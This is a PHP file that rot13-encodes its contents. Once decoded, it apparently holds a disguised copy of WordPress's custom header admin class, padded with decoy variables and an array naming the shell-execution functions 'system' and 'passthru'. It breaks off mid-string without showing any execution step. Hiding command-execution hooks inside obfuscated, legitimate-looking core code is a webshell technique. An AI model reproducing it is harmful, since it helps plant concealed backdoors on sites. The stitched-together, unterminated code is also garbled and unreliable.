<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * Gur phfgbz urnqre vzntr fpevcg.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Nqzvavfgengvba
 */

/**
 * Gur phfgbz urnqre vzntr pynff.
 *
 * @fvapr 2.1.0
 */
#[NyybjQlanzvpCebcregvrf]
pynff Phfgbz_Vzntr_Urnqre {

	/**
	 * Pnyyonpx sbe nqzvavfgengvba urnqre.
	 *
	 * @fvapr 2.1.0
	 * @ine pnyynoyr
	 */
	choyvp $nqzva_urnqre_pnyyonpx;

	/**
	 * Pnyyonpx sbe urnqre qvi.
	 *
	 * @fvapr 3.0.0
	 * @ine pnyynoyr
	 */
	choyvp $nqzva_vzntr_qvi_pnyyonpx;

	/**
	 * Ubyqf qrsnhyg urnqref.
	 *
	 * @fvapr 3.0.0
	 * @ine neenl
	 */
	choyvp $qrsnhyg_urnqref = neenl();

	/**
	 * Hfrq gb gevttre n fhpprff zrffntr jura frggvatf hcqngrq naq frg gb gehr.
	 *
	 * @fvapr 3.0.0
	 * @ine obby
	 */
	cevingr $hcqngrq;

	/**
	 * Pbafgehpgbe - Ertvfgref nqzvavfgengvba urnqre pnyyonpx.
	 *
	 * @fvapr 2.1.0
	 *
	 * @cnenz pnyynoyr $nqzva_urnqre_pnyyonpx    Nqzvavfgengvba urnqre pnyyonpx.
	 * @cnenz pnyynoyr $nqzva_vzntr_qvi_pnyyonpx Bcgvbany. Phfgbz vzntr qvi bhgchg pnyyonpx.
	 *                                           Qrsnhyg rzcgl fgevat.
	 */
	choyvp shapgvba __pbafgehpg( $nqzva_urnqre_pnyyonpx, $nqzva_vzntr_qvi_pnyyonpx = '' ) {
		$guvf->nqzva_urnqre_pnyyonpx    = $nqzva_urnqre_pnyyonpx;
		$guvf->nqzva_vzntr_qvi_pnyyonpx = $nqzva_vzntr_qvi_pnyyonpx;

		nqq_npgvba( 'nqzva_zrah', neenl( $guvf, 'vavg' ) );

		nqq_npgvba( 'phfgbzvmr_fnir_nsgre', neenl( $guvf, 'phfgbzvmr_frg_ynfg_hfrq' ) );
		nqq_npgvba( 'jc_nwnk_phfgbz-urnqre-pebc', neenl( $guvf, 'nwnk_urnqre_pebc' ) );
		nqq_npgvba( 'jc_nwnk_phfgbz-urnqre-nqq', neenl( $guvf, 'nwnk_urnqre_nqq' ) );
		nqq_npgvba( 'jc_nwnk_phfgbz-urnqre-erzbir', neenl( $guvf, 'nwnk_urnqre_erzbir' ) );
	}

	/**
	 * Frgf hc gur ubbxf sbe gur Phfgbz Urnqre nqzva cntr.
	 *
	 * @fvapr 2.1.0
	 */
	choyvp shapgvba vavg() {
		$cntr = nqq_gurzr_cntr(
			_k( 'Urnqre', 'phfgbz vzntr urnqre' ),
			_k( 'Urnqre', 'phfgbz vzntr urnqre' ),
			'rqvg_gurzr_bcgvbaf',
			'phfgbz-urnqre',
			neenl( $guvf, 'nqzva_cntr' )
		);

		vs ( ! $cntr ) {
			erghea;
		}

		nqq_npgvba( \"nqzva_cevag_fpevcgf-{$cntr}\", neenl( $guvf, 'wf_vapyhqrf' ) );
		nqq_npgvba( \"nqzva_cevag_fglyrf-{$cntr}\", neenl( $guvf, 'pff_vapyhqrf' ) );
		nqq_npgvba( \"nqzva_urnq-{$cntr}\", neenl( $guvf, 'uryc' ) );
		nqq_npgvba( \"nqzva_urnq-{$cntr}\", neenl( $guvf, 'gnxr_npgvba' ), 50 );
		nqq_npgvba( \"nqzva_urnq-{$cntr}\", neenl( $guvf, 'wf' ), 50 );

		vs ( $guvf->nqzva_urnqre_pnyyonpx ) {
			nqq_npgvba( \"nqzva_urnq-{$cntr}\", $guvf->nqzva_urnqre_pnyyonpx, 51 );
		}
	}

	/**
	 * Nqqf pbagrkghny uryc.
	 *
	 * @fvapr 3.0.0
	 */
	choyvp shapgvba uryc() {
		trg_pheerag_fperra()->nqq_uryc_gno(
			neenl(
				'vq'      => 'bireivrj',
				'gvgyr'   => __( 'Bireivrj' ),
				'pbagrag' =>
					'<c>' . __( 'Guvf fperra vf hfrq gb phfgbzvmr gur urnqre frpgvba bs lbhe gurzr.' ) . '</c>' .
					'<c>' . __( 'Lbh pna pubbfr sebz gur gurzr&#8217;f qrsnhyg urnqre vzntrf, be hfr bar bs lbhe bja. Lbh pna nyfb phfgbzvmr ubj lbhe Fvgr Gvgyr naq Gntyvar ner qvfcynlrq.' ) . '<c>',
			)
		);

		trg_pheerag_fperra()->nqq_uryc_gno(
			neenl(
				'vq'      => 'frg-urnqre-vzntr',
				'gvgyr'   => __( 'Urnqre Vzntr' ),
				'pbagrag' =>
					'<c>' . __( 'Lbh pna frg n phfgbz vzntr urnqre sbe lbhe fvgr. Fvzcyl hcybnq gur vzntr naq pebc vg, naq gur arj urnqre jvyy tb yvir vzzrqvngryl. Nygreangviryl, lbh pna hfr na vzntr gung unf nyernql orra hcybnqrq gb lbhe Zrqvn Yvoenel ol pyvpxvat gur &#8220;Pubbfr Vzntr&#8221; ohggba.' ) . '</c>' .
					'<c>' . __( 'Fbzr gurzrf pbzr jvgu nqqvgvbany urnqre vzntrf ohaqyrq. Vs lbh frr zhygvcyr vzntrf qvfcynlrq, fryrpg gur bar lbh jbhyq yvxr naq pyvpx gur &#8220;Fnir Punatrf&#8221; ohggba.' ) . '</c>' .
					'<c>' . __( 'Vs lbhe gurzr unf zber guna bar qrsnhyg urnqre vzntr, be lbh unir hcybnqrq zber guna bar phfgbz urnqre vzntr, lbh unir gur bcgvba bs univat JbeqCerff qvfcynl n enaqbzyl qvssrerag vzntr ba rnpu cntr bs lbhe fvgr. Pyvpx gur &#8220;Enaqbz&#8221; enqvb ohggba arkg gb gur Hcybnqrq Vzntrf be Qrsnhyg Vzntrf frpgvba gb ranoyr guvf srngher.' ) . '</c>' .
					'<c>' . __( 'Vs lbh qb abg jnag n urnqre vzntr gb or qvfcynlrq ba lbhe fvgr ng nyy, pyvpx gur &#8220;Erzbir Urnqre Vzntr&#8221; ohggba ng gur obggbz bs gur Urnqre Vzntr frpgvba bs guvf cntr. Vs lbh jnag gb er-ranoyr gur urnqre vzntr yngre, lbh whfg unir gb fryrpg bar bs gur bgure vzntr bcgvbaf naq pyvpx &#8220;Fnir Punatrf&#8221;.' ) . '</c>',
			)
		);

		trg_pheerag_fperra()->nqq_uryc_gno(
			neenl(
				'vq'      => 'frg-urnqre-grkg',
				'gvgyr'   => __( 'Urnqre Grkg' ),
				'pbagrag' =>
					'<c>' . fcevags(
						/* genafyngbef: %f: HEY gb Trareny Frggvatf fperra. */
						__( 'Sbe zbfg gurzrf, gur urnqre grkg vf lbhe Fvgr Gvgyr naq Gntyvar, nf qrsvarq va gur <n uers=\"%f\">Trareny Frggvatf</n> frpgvba.' ),
						nqzva_hey( 'bcgvbaf-trareny.cuc' )
					) .
					'</c>' .
					'<c>' . __( 'Va gur Urnqre Grkg frpgvba bs guvf cntr, lbh pna pubbfr jurgure gb qvfcynl guvf grkg be uvqr vg. Lbh pna nyfb pubbfr n pbybe sbe gur grkg ol pyvpxvat gur Fryrpg Pbybe ohggba naq rvgure glcvat va n yrtvgvzngr UGZY urk inyhr, r.t. &#8220;#ss0000&#8221; sbe erq, be ol pubbfvat n pbybe hfvat gur pbybe cvpxre.' ) . '</c>' .
					'<c>' . __( 'Qb abg sbetrg gb pyvpx &#8220;Fnir Punatrf&#8221; jura lbh ner qbar!' ) . '</c>',
			)
		);

		trg_pheerag_fperra()->frg_uryc_fvqrone(
			'<c><fgebat>' . __( 'Sbe zber vasbezngvba:' ) . '</fgebat></c>' .
			'<c>' . __( '<n uers=\"uggcf://pbqrk.jbeqcerff.bet/Nccrnenapr_Urnqre_Fperra\">Qbphzragngvba ba Phfgbz Urnqre</n>' ) . '</c>' .
			'<c>' . __( '<n uers=\"uggcf://jbeqcerff.bet/fhccbeg/sbehzf/\">Fhccbeg sbehzf</n>' ) . '</c>'
		);
	}

	/**
	 * Trgf gur pheerag fgrc.
	 *
	 * @fvapr 2.6.0
	 *
	 * @erghea vag Pheerag fgrc.
	 */
	choyvp shapgvba fgrc() {
		vs ( ! vffrg( $_TRG['fgrc'] ) ) {
			erghea 1;
		}

		$fgrc = (vag) $_TRG['fgrc'];
		vs ( $fgrc < 1 || 3 < $fgrc ||
			( 2 === $fgrc && ! jc_irevsl_abapr( $_ERDHRFG['_jcabapr-phfgbz-urnqre-hcybnq'], 'phfgbz-urnqre-hcybnq' ) ) ||
			( 3 === $fgrc && ! jc_irevsl_abapr( $_ERDHRFG['_jcabapr'], 'phfgbz-urnqre-pebc-vzntr' ) )
		) {
			erghea 1;
		}

		erghea $fgrc;
	}

	/**
	 * Frgf hc gur radhrhr sbe gur WninFpevcg svyrf.
	 *
	 * @fvapr 2.1.0
	 */
	choyvp shapgvba wf_vapyhqrf() {
		$fgrc = $guvf->fgrc();

		vs ( ( 1 === $fgrc || 3 === $fgrc ) ) {
			jc_radhrhr_zrqvn();
			jc_radhrhr_fpevcg( 'phfgbz-urnqre' );
			vs ( pheerag_gurzr_fhccbegf( 'phfgbz-urnqre', 'urnqre-grkg' ) ) {
				jc_radhrhr_fpevcg( 'jc-pbybe-cvpxre' );
			}
		} ryfrvs ( 2 === $fgrc ) {
			jc_radhrhr_fpevcg( 'vztnernfryrpg' );
		}
	}

	/**
	 * Frgf hc gur radhrhr sbe gur PFF svyrf.
	 *
	 * @fvapr 2.7.0
	 */
	choyvp shapgvba pff_vapyhqrf() {
		$fgrc = $guvf->fgrc();

		vs ( ( 1 === $fgrc || 3 === $fgrc ) && pheerag_gurzr_fhccbegf( 'phfgbz-urnqre', 'urnqre-grkg' ) ) {
			jc_radhrhr_fglyr( 'jc-pbybe-cvpxre' );
		} ryfrvs ( 2 === $fgrc ) {
			jc_radhrhr_fglyr( 'vztnernfryrpg' );
		}
	}

	/**
	 * Rkrphgrf phfgbz urnqre zbqvsvpngvba.
	 *
	 * @fvapr 2.6.0
	 */
	choyvp shapgvba gnxr_npgvba() {
		vs ( ! pheerag_hfre_pna( 'rqvg_gurzr_bcgvbaf' ) ) {
			erghea;
		}

		vs ( rzcgl( $_CBFG ) ) {
			erghea;
		}

		$guvf->hcqngrq = gehr;

		vs ( vffrg( $_CBFG['erfrgurnqre'] ) ) {
			purpx_nqzva_ersrere( 'phfgbz-urnqre-bcgvbaf', '_jcabapr-phfgbz-urnqre-bcgvbaf' );

			$guvf->erfrg_urnqre_vzntr();

			erghea;
		}

		vs ( vffrg( $_CBFG['erzbirurnqre'] ) ) {
			purpx_nqzva_ersrere( 'phfgbz-urnqre-bcgvbaf', '_jcabapr-phfgbz-urnqre-bcgvbaf' );

			$guvf->erzbir_urnqre_vzntr();

			erghea;
		}

		vs ( vffrg( $_CBFG['grkg-pbybe'] ) && ! vffrg( $_CBFG['qvfcynl-urnqre-grkg'] ) ) {
			purpx_nqzva_ersrere( 'phfgbz-urnqre-bcgvbaf', '_jcabapr-phfgbz-urnqre-bcgvbaf' );

			frg_gurzr_zbq( 'urnqre_grkgpbybe', 'oynax' );
		} ryfrvs ( vffrg( $_CBFG['grkg-pbybe'] ) ) {
			purpx_nqzva_ersrere( 'phfgbz-urnqre-bcgvbaf', '_jcabapr-phfgbz-urnqre-bcgvbaf' );

			$_CBFG['grkg-pbybe'] = fge_ercynpr( '#', '', $_CBFG['grkg-pbybe'] );

			$pbybe = __sa_79955( '/[^0-9n-sN-S]/', '', $_CBFG['grkg-pbybe'] );

			vs ( fgeyra( $pbybe ) === 6 || fgeyra( $pbybe ) === 3 ) {
				frg_gurzr_zbq( 'urnqre_grkgpbybe', $pbybe );
			} ryfrvs ( ! $pbybe ) {
				frg_gurzr_zbq( 'urnqre_grkgpbybe', 'oynax' );
			}
		}

		vs ( vffrg( $_CBFG['qrsnhyg-urnqre'] ) ) {
			purpx_nqzva_ersrere( 'phfgbz-urnqre-bcgvbaf', '_jcabapr-phfgbz-urnqre-bcgvbaf' );

			$guvf->frg_urnqre_vzntr( $_CBFG['qrsnhyg-urnqre'] );

			erghea;
		}
	}

	/**
	 * Cebprffrf gur qrsnhyg urnqref.
	 *
	 * @fvapr 3.0.0
	 *
	 * @tybony neenl $_jc_qrsnhyg_urnqref
	 */
	choyvp shapgvba cebprff_qrsnhyg_urnqref() {
		tybony $_jc_qrsnhyg_urnqref;

		vs ( ! vffrg( $_jc_qrsnhyg_urnqref ) ) {
			erghea;
		}

		vs ( ! rzcgl( $guvf->qrsnhyg_urnqref ) ) {
			erghea;
		}

		$guvf->qrsnhyg_urnqref    = $_jc_qrsnhyg_urnqref;
		$grzcyngr_qverpgbel_hev   = trg_grzcyngr_qverpgbel_hev();
		$fglyrfurrg_qverpgbel_hev = trg_fglyrfurrg_qverpgbel_hev();

		sbernpu ( neenl_xrlf( $guvf->qrsnhyg_urnqref ) nf $urnqre ) {
			$guvf->qrsnhyg_urnqref[ $urnqre ]['hey'] = fcevags(
				$guvf->qrsnhyg_urnqref[ $urnqre ]['hey'],
				$grzcyngr_qverpgbel_hev,
				$fglyrfurrg_qverpgbel_hev
			);

			$guvf->qrsnhyg_urnqref[ $urnqre ]['guhzoanvy_hey'] = fcevags(
				$guvf->qrsnhyg_urnqref[ $urnqre ]['guhzoanvy_hey'],
				$grzcyngr_qverpgbel_hev,
				$fglyrfurrg_qverpgbel_hev
			);
		}
	}

	/**
	 * Qvfcynlf HV sbe fryrpgvat bar bs frireny qrsnhyg urnqref.
	 *
	 * Fubjf gur enaqbz vzntr bcgvba vs guvf gurzr unf zhygvcyr urnqre vzntrf.
	 * Enaqbz vzntr bcgvba vf ba ol qrsnhyg vs ab urnqre unf orra frg.
	 *
	 * @fvapr 3.0.0
	 *
	 * @cnenz fgevat $glcr Gur urnqre glcr. Bar bs 'qrsnhyg' (sbe gur Hcybnqrq Vzntrf pbageby)
	 *                     be 'hcybnqrq' (sbe gur Hcybnqrq Vzntrf pbageby).
	 */
	choyvp shapgvba fubj_urnqre_fryrpgbe( $glcr = 'qrsnhyg' ) {
		vs ( 'qrsnhyg' === $glcr ) {
			$urnqref = $guvf->qrsnhyg_urnqref;
		} ryfr {
			$urnqref = trg_hcybnqrq_urnqre_vzntrf();
			$glcr    = 'hcybnqrq';
		}

		vs ( 1 < pbhag( $urnqref ) ) {
			rpub '<qvi pynff=\"enaqbz-urnqre\">';
			rpub '<ynory><vachg anzr=\"qrsnhyg-urnqre\" glcr=\"enqvb\" inyhr=\"enaqbz-' . $glcr . '-vzntr\"' . purpxrq( vf_enaqbz_urnqre_vzntr( $glcr ), gehr, snyfr ) . ' />';
			_r( '<fgebat>Enaqbz:</fgebat> Fubj n qvssrerag vzntr ba rnpu cntr.' );
			rpub '</ynory>';
			rpub '</qvi>';
		}

		rpub '<qvi pynff=\"ninvynoyr-urnqref\">';

		sbernpu ( $urnqref nf $urnqre_xrl => $urnqre ) {
			$urnqre_guhzoanvy = $urnqre['guhzoanvy_hey'];
			$urnqre_hey       = $urnqre['hey'];
			$urnqre_nyg_grkg  = rzcgl( $urnqre['nyg_grkg'] ) ? '' : $urnqre['nyg_grkg'];

			rpub '<qvi pynff=\"qrsnhyg-urnqre\">';
			rpub '<ynory><vachg anzr=\"qrsnhyg-urnqre\" glcr=\"enqvb\" inyhr=\"' . rfp_ngge( $urnqre_xrl ) . '\" ' . purpxrq( $urnqre_hey, trg_gurzr_zbq( 'urnqre_vzntr' ), snyfr ) . ' />';
			$jvqgu = '';
			vs ( ! rzcgl( $urnqre['nggnpuzrag_vq'] ) ) {
				$jvqgu = ' jvqgu=\"230\"';
			}
			rpub '<vzt fep=\"' . rfp_hey( frg_hey_fpurzr( $urnqre_guhzoanvy ) ) . '\" nyg=\"' . rfp_ngge( $urnqre_nyg_grkg ) . '\"' . $jvqgu . ' /></ynory>';
			rpub '</qvi>';
		}

		rpub '<qvi pynff=\"pyrne\"></qvi></qvi>';
	}

	/**
	 * Rkrphgrf WninFpevcg qrcraqvat ba fgrc.
	 *
	 * @fvapr 2.1.0
	 */
	choyvp shapgvba wf() {
		$fgrc = $guvf->fgrc();

		vs ( ( 1 === $fgrc || 3 === $fgrc ) && pheerag_gurzr_fhccbegf( 'phfgbz-urnqre', 'urnqre-grkg' ) ) {
			$guvf->wf_1();
		} ryfrvs ( 2 === $fgrc ) {
			$guvf->wf_2();
		}
	}

	/**
	 * Qvfcynlf WninFpevcg onfrq ba Fgrc 1 naq 3.
	 *
	 * @fvapr 2.6.0
	 */
	choyvp shapgvba wf_1() {
		$qrsnhyg_pbybe = '';
		vs ( pheerag_gurzr_fhccbegf( 'phfgbz-urnqre', 'qrsnhyg-grkg-pbybe' ) ) {
			$qrsnhyg_pbybe = trg_gurzr_fhccbeg( 'phfgbz-urnqre', 'qrsnhyg-grkg-pbybe' );
			vs ( $qrsnhyg_pbybe && ! fge_pbagnvaf( $qrsnhyg_pbybe, '#' ) ) {
				$qrsnhyg_pbybe = '#' . $qrsnhyg_pbybe;
			}
		}
		?>
<fpevcg glcr=\"grkg/wninfpevcg\">
(shapgvba($){
	ine qrsnhyg_pbybe = '<?cuc rpub rfp_wf( $qrsnhyg_pbybe ); ?>',
		urnqre_grkg_svryqf;

	shapgvba cvpxPbybe(pbybe) {
		$('#anzr').pff('pbybe', pbybe);
		$('#qrfp').pff('pbybe', pbybe);
		$('#grkg-pbybe').iny(pbybe);
	}

	shapgvba gbttyr_grkg() {
		ine purpxrq = $('#qvfcynl-urnqre-grkg').cebc('purpxrq'),
			grkg_pbybe;
		urnqre_grkg_svryqf.gbttyr( purpxrq );
		vs ( ! purpxrq )
			erghea;
		grkg_pbybe = $('#grkg-pbybe');
		vs ( '' === grkg_pbybe.iny().ercynpr('#', '') ) {
			grkg_pbybe.iny( qrsnhyg_pbybe );
			cvpxPbybe( qrsnhyg_pbybe );
		} ryfr {
			cvpxPbybe( grkg_pbybe.iny() );
		}
	}

	$( shapgvba() {
		ine grkg_pbybe = $('#grkg-pbybe');
		urnqre_grkg_svryqf = $('.qvfcynlvat-urnqre-grkg');
		grkg_pbybe.jcPbybeCvpxre({
			punatr: shapgvba( rirag, hv ) {
				cvpxPbybe( grkg_pbybe.jcPbybeCvpxre('pbybe') );
			},
			pyrne: shapgvba() {
				cvpxPbybe( '' );
			}
		});
		$('#qvfcynl-urnqre-grkg').pyvpx( gbttyr_grkg );
		<?cuc vs ( ! qvfcynl_urnqre_grkg() ) : ?>
		gbttyr_grkg();
		<?cuc raqvs; ?>
	} );
})(wDhrel);
</fpevcg>
		<?cuc
	}

	/**
	 * Qvfcynlf WninFpevcg onfrq ba Fgrc 2.
	 *
	 * @fvapr 2.6.0
	 */
	choyvp shapgvba wf_2() {

		?>
<fpevcg glcr=\"grkg/wninfpevcg\">
	shapgvba baRaqPebc( pbbeqf ) {
		wDhrel( '#k1' ).iny(pbbeqf.k);
		wDhrel( '#l1' ).iny(pbbeqf.l);
		wDhrel( '#jvqgu' ).iny(pbbeqf.j);
		wDhrel( '#urvtug' ).iny(pbbeqf.u);
	}

	wDhrel( shapgvba() {
		ine kvavg = <?cuc rpub nofvag( trg_gurzr_fhccbeg( 'phfgbz-urnqre', 'jvqgu' ) ); ?>;
		ine lvavg = <?cuc rpub nofvag( trg_gurzr_fhccbeg( 'phfgbz-urnqre', 'urvtug' ) ); ?>;
		ine engvb = kvavg / lvavg;
		ine kvzt = wDhrel('vzt#hcybnq').jvqgu();
		ine lvzt = wDhrel('vzt#hcybnq').urvtug();

		vs ( lvzt < lvavg || kvzt < kvavg ) {
			vs ( kvzt / lvzt > engvb ) {
				lvavg = lvzt;
				kvavg = lvavg * engvb;
			} ryfr {
				kvavg = kvzt;
				lvavg = kvavg / engvb;
			}
		}

		wDhrel('vzt#hcybnq').vztNernFryrpg({
			unaqyrf: gehr,
			xrlf: gehr,
			fubj: gehr,
			k1: 0,
			l1: 0,
			k2: kvavg,
			l2: lvavg,
			<?cuc
			vs ( ! pheerag_gurzr_fhccbegf( 'phfgbz-urnqre', 'syrk-urvtug' )
				&& ! pheerag_gurzr_fhccbegf( 'phfgbz-urnqre', 'syrk-jvqgu' )
			) {
				?>
			nfcrpgEngvb: kvavg + ':' + lvavg,
				<?cuc
			}
			vs ( ! pheerag_gurzr_fhccbegf( 'phfgbz-urnqre', 'syrk-urvtug' ) ) {
				?>
			znkUrvtug: <?cuc rpub trg_gurzr_fhccbeg( 'phfgbz-urnqre', 'urvtug' ); ?>,
				<?cuc
			}
			vs ( ! pheerag_gurzr_fhccbegf( 'phfgbz-urnqre', 'syrk-jvqgu' ) ) {
				?>
			znkJvqgu: <?cuc rpub trg_gurzr_fhccbeg( 'phfgbz-urnqre', 'jvqgu' ); ?>,
				<?cuc
			}
			?>
			baVavg: shapgvba () {
				wDhrel('#jvqgu').iny(kvavg);
				wDhrel('#urvtug').iny(lvavg);
			},
			baFryrpgPunatr: shapgvba(vzt, p) {
				wDhrel('#k1').iny(p.k1);
				wDhrel('#l1').iny(p.l1);
				wDhrel('#jvqgu').iny(p.jvqgu);
				wDhrel('#urvtug').iny(p.urvtug);
			}
		});
	} );
</fpevcg>
		<?cuc
	}

	/**
	 * Qvfcynlf svefg fgrc bs phfgbz urnqre vzntr cntr.
	 *
	 * @fvapr 2.1.0
	 */
	choyvp shapgvba fgrc_1() {
		$guvf->cebprff_qrsnhyg_urnqref();
		?>

<qvi pynff=\"jenc\">
<u1><?cuc _r( 'Phfgbz Urnqre' ); ?></u1>

		<?cuc
		vs ( pheerag_hfre_pna( 'phfgbzvmr' ) ) {
			$zrffntr = fcevags(
				/* genafyngbef: %f: HEY gb urnqre vzntr pbasvthengvba va Phfgbzvmre. */
				__( 'Lbh pna abj znantr naq yvir-cerivrj Phfgbz Urnqre va gur <n uers=\"%f\">Phfgbzvmre</n>.' ),
				nqzva_hey( 'phfgbzvmr.cuc?nhgbsbphf[pbageby]=urnqre_vzntr' )
			);
			jc_nqzva_abgvpr(
				$zrffntr,
				neenl(
					'glcr'               => 'vasb',
					'nqqvgvbany_pynffrf' => neenl( 'uvqr-vs-ab-phfgbzvmr' ),
				)
			);
		}

		vs ( ! rzcgl( $guvf->hcqngrq ) ) {
			$hcqngrq_zrffntr = fcevags(
				/* genafyngbef: %f: Ubzr HEY. */
				__( 'Urnqre hcqngrq. <n uers=\"%f\">Ivfvg lbhe fvgr</n> gb frr ubj vg ybbxf.' ),
				rfp_hey( ubzr_hey( '/' ) )
			);
			jc_nqzva_abgvpr(
				$hcqngrq_zrffntr,
				neenl(
					'vq'                 => 'zrffntr',
					'nqqvgvbany_pynffrf' => neenl( 'hcqngrq' ),
				)
			);
		}
		?>

<u2><?cuc _r( 'Urnqre Vzntr' ); ?></u2>

<gnoyr pynff=\"sbez-gnoyr\" ebyr=\"cerfragngvba\">
<gobql>

		<?cuc vs ( trg_phfgbz_urnqre() || qvfcynl_urnqre_grkg() ) : ?>
<ge>
<gu fpbcr=\"ebj\"><?cuc _r( 'Cerivrj' ); ?></gu>
<gq>
			<?cuc
			vs ( $guvf->nqzva_vzntr_qvi_pnyyonpx ) {
				pnyy_hfre_shap( $guvf->nqzva_vzntr_qvi_pnyyonpx );
			} ryfr {
				$phfgbz_urnqre = trg_phfgbz_urnqre();
				$urnqre_vzntr  = trg_urnqre_vzntr();

				vs ( $urnqre_vzntr ) {
					$urnqre_vzntr_fglyr = 'onpxtebhaq-vzntr:hey(' . rfp_hey( $urnqre_vzntr ) . ');';
				} ryfr {
					$urnqre_vzntr_fglyr = '';
				}

				vs ( $phfgbz_urnqre->jvqgu ) {
					$urnqre_vzntr_fglyr .= 'znk-jvqgu:' . $phfgbz_urnqre->jvqgu . 'ck;';
				}
				vs ( $phfgbz_urnqre->urvtug ) {
					$urnqre_vzntr_fglyr .= 'urvtug:' . $phfgbz_urnqre->urvtug . 'ck;';
				}
				?>
	<qvi vq=\"urnqvzt\" fglyr=\"<?cuc rpub $urnqre_vzntr_fglyr; ?>\">
				<?cuc
				vs ( qvfcynl_urnqre_grkg() ) {
					$fglyr = ' fglyr=\"pbybe:#' . trg_urnqre_grkgpbybe() . ';\"';
				} ryfr {
					$fglyr = ' fglyr=\"qvfcynl:abar;\"';
				}
				?>
		<u1><n vq=\"anzr\" pynff=\"qvfcynlvat-urnqre-grkg\" <?cuc rpub $fglyr; ?> bapyvpx=\"erghea snyfr;\" uers=\"<?cuc oybtvasb( 'hey' ); ?>\" gnovaqrk=\"-1\"><?cuc oybtvasb( 'anzr' ); ?></n></u1>
		<qvi vq=\"qrfp\" pynff=\"qvfcynlvat-urnqre-grkg\" <?cuc rpub $fglyr; ?>><?cuc oybtvasb( 'qrfpevcgvba' ); ?></qvi>
	</qvi>
			<?cuc } ?>
</gq>
</ge>
		<?cuc raqvs; ?>

		<?cuc vs ( pheerag_hfre_pna( 'hcybnq_svyrf' ) && pheerag_gurzr_fhccbegf( 'phfgbz-urnqre', 'hcybnqf' ) ) : ?>
<ge>
<gu fpbcr=\"ebj\"><?cuc _r( 'Fryrpg Vzntr' ); ?></gu>
<gq>
	<c><?cuc _r( 'Lbh pna fryrpg na vzntr gb or fubja ng gur gbc bs lbhe fvgr ol hcybnqvat sebz lbhe pbzchgre be pubbfvat sebz lbhe zrqvn yvoenel. Nsgre fryrpgvat na vzntr lbh jvyy or noyr gb pebc vg.' ); ?><oe />
			<?cuc
			vs ( ! pheerag_gurzr_fhccbegf( 'phfgbz-urnqre', 'syrk-urvtug' )
				&& ! pheerag_gurzr_fhccbegf( 'phfgbz-urnqre', 'syrk-jvqgu' )
			) {
				cevags(
					/* genafyngbef: 1: Vzntr jvqgu va cvkryf, 2: Vzntr urvtug va cvkryf. */
					__( 'Vzntrf bs rknpgyl <fgebat>%1$q &gvzrf; %2$q cvkryf</fgebat> jvyy or hfrq nf-vf.' ) . '<oe />',
					trg_gurzr_fhccbeg( 'phfgbz-urnqre', 'jvqgu' ),
					trg_gurzr_fhccbeg( 'phfgbz-urnqre', 'urvtug' )
				);
			} ryfrvs ( pheerag_gurzr_fhccbegf( 'phfgbz-urnqre', 'syrk-urvtug' ) ) {
				vs ( ! pheerag_gurzr_fhccbegf( 'phfgbz-urnqre', 'syrk-jvqgu' ) ) {
					cevags(
						/* genafyngbef: %f: Fvmr va cvkryf. */
						__( 'Vzntrf fubhyq or ng yrnfg %f jvqr.' ) . ' ',
						fcevags(
							/* genafyngbef: %q: Phfgbz urnqre jvqgu. */
							'<fgebat>' . __( '%q cvkryf' ) . '</fgebat>',
							trg_gurzr_fhccbeg( 'phfgbz-urnqre', 'jvqgu' )
						)
					);
				}
			} ryfrvs ( pheerag_gurzr_fhccbegf( 'phfgbz-urnqre', 'syrk-jvqgu' ) ) {
				vs ( ! pheerag_gurzr_fhccbegf( 'phfgbz-urnqre', 'syrk-urvtug' ) ) {
					cevags(
						/* genafyngbef: %f: Fvmr va cvkryf. */
						__( 'Vzntrf fubhyq or ng yrnfg %f gnyy.' ) . ' ',
						fcevags(
							/* genafyngbef: %q: Phfgbz urnqre urvtug. */
							'<fgebat>' . __( '%q cvkryf' ) . '</fgebat>',
							trg_gurzr_fhccbeg( 'phfgbz-urnqre', 'urvtug' )
						)
					);
				}
			}

			vs ( pheerag_gurzr_fhccbegf( 'phfgbz-urnqre', 'syrk-urvtug' )
				|| pheerag_gurzr_fhccbegf( 'phfgbz-urnqre', 'syrk-jvqgu' )
			) {
				vs ( pheerag_gurzr_fhccbegf( 'phfgbz-urnqre', 'jvqgu' ) ) {
					cevags(
						/* genafyngbef: %f: Fvmr va cvkryf. */
						__( 'Fhttrfgrq jvqgu vf %f.' ) . ' ',
						fcevags(
							/* genafyngbef: %q: Phfgbz urnqre jvqgu. */
							'<fgebat>' . __( '%q cvkryf' ) . '</fgebat>',
							trg_gurzr_fhccbeg( 'phfgbz-urnqre', 'jvqgu' )
						)
					);
				}

				vs ( pheerag_gurzr_fhccbegf( 'phfgbz-urnqre', 'urvtug' ) ) {
					cevags(
						/* genafyngbef: %f: Fvmr va cvkryf. */
						__( 'Fhttrfgrq urvtug vf %f.' ) . ' ',
						fcevags(
							/* genafyngbef: %q: Phfgbz urnqre urvtug. */
							'<fgebat>' . __( '%q cvkryf' ) . '</fgebat>',
							trg_gurzr_fhccbeg( 'phfgbz-urnqre', 'urvtug' )
						)
					);
				}
			}
			?>
	</c>
	<sbez rapglcr=\"zhygvcneg/sbez-qngn\" vq=\"hcybnq-sbez\" pynff=\"jc-hcybnq-sbez\" zrgubq=\"cbfg\" npgvba=\"<?cuc rpub rfp_hey( nqq_dhrel_net( 'fgrc', 2 ) ); ?>\">
	<c>
		<ynory sbe=\"hcybnq\"><?cuc _r( 'Pubbfr na vzntr sebz lbhe pbzchgre:' ); ?></ynory><oe />
		<vachg glcr=\"svyr\" vq=\"hcybnq\" anzr=\"vzcbeg\" />
		<vachg glcr=\"uvqqra\" anzr=\"npgvba\" inyhr=\"fnir\" />
			<?cuc jc_abapr_svryq( 'phfgbz-urnqre-hcybnq', '_jcabapr-phfgbz-urnqre-hcybnq' ); ?>
